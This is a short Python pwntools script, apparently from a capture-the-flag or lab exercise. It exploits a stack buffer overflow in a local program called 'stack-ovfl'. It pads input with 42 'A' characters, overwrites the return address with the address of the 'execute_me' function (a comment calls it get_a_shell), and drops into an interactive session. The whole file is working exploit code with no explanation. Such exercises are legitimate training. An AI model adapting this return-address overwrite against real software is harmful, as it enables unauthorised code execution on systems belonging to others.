#!/usr/bin/env python
from pwn import	*

stack_offset = 42
stack = p32(0xffffd460)

p = process("./stack-ovfl")

# load the program as an ELF object
e = ELF("./stack-ovfl")

# get the address of get_a_shell
jump_address = e.symbols['execute_me']

print hex(jump_address)

buffer = 'A'*stack_offset + p32(jump_address)

p.sendline(buffer)

p.interactive()

